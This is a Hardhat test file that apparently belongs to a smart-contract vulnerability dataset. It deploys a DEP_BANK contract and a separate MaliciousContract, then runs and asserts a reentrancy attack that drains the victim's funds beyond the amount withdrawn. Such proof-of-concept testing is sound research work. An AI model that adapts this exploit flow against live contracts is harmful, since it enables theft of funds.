const { expect } = require("chai");
const { ethers } = require("hardhat");
const path = require("path");
const fs = require("fs");
describe("Reentrancy Attack for 0xaae1f51cf3339f18b6d3f3bdc75a5facd744b0b8.sol", function () {  
    let DEP_BANK;
    let victim;
    let MaliciousContract;
    let hacker;
    let Log;
    let log;

    beforeEach(async function () {
        // Deploy Log contract
        const logPath = path.join(__dirname, '../../artifacts/contracts/dataset/reentrancy/0xaae1f51cf3339f18b6d3f3bdc75a5facd744b0b8.sol/LogFile.json');
        const logJson = JSON.parse(fs.readFileSync(logPath));
        Log = await ethers.getContractFactory(logJson.abi, logJson.bytecode);
        log = await Log.deploy();
        await log.waitForDeployment();

        // Deploy DEP_BANK contract with Log address
        const codePath = path.join(__dirname, '../../artifacts/contracts/dataset/reentrancy/0xaae1f51cf3339f18b6d3f3bdc75a5facd744b0b8.sol/DEP_BANK.json');
        const json = JSON.parse(fs.readFileSync(codePath));
        DEP_BANK = await ethers.getContractFactory(json.abi, json.bytecode);
        victim = await DEP_BANK.deploy();
        await victim.waitForDeployment();
        victim.SetLogFile(log.target); // Set Log address on constructor
        
        // Deploy MaliciousContract with DEP_BANK address
        MaliciousContract = await ethers.getContractFactory("contracts/reentrancy/0xaae1f51cf3339f18b6d3f3bdc75a5facd744b0b8_attack.sol:MaliciousContract");
        hacker = await MaliciousContract.deploy(victim.target);
        
    });

    it('sanity check: reentrancy/0xaae1f51cf3339f18b6d3f3bdc75a5facd744b0b8.sol', async function () {
        await expect(victim.Deposit({ value: 0 })).to.not.be.reverted;
      });

    it("should successfully drain funds through reentrancy attack", async function () {
        // Initial deposit to victim contract
        await victim.Deposit( {value: ethers.parseEther("5") });

        const victimInitialBalance = await ethers.provider.getBalance(victim.target);
        expect(victimInitialBalance).to.equal(ethers.parseEther("5")); 


        // Initial deposit from maliciousContract on victim contract
        await hacker.deposit({value:  ethers.parseEther("4")});

          

        const victimBalanceAfterDeposit = await ethers.provider.getBalance(victim.target);
        expect(victimBalanceAfterDeposit).to.equal(ethers.parseEther("9")); 

        // Set hacker balance to 0
        await network.provider.send("hardhat_setBalance", [
            hacker.target,
            "0x0",
          ]);
        let hackerBalance = await ethers.provider.getBalance(hacker.target);
        expect(hackerBalance).to.equal(0);

        // Perform reentrancy attack through MaliciousContract
        await hacker.attack( ethers.parseEther("3"));

        
        // Check balances after attack
        const victimBalance = await ethers.provider.getBalance(victim.target);
        const maliciousContractBalance = await ethers.provider.getBalance(hacker.target);

        // Verify the attack was successful
        
        // victim has lost more funds than the withdrawal
        expect(victimBalance).to.be.below(ethers.parseEther("6")); 

        // hacker has more than the withdrawal 
        expect(maliciousContractBalance).to.be.above(ethers.parseEther("3"));
        
    });
    });
  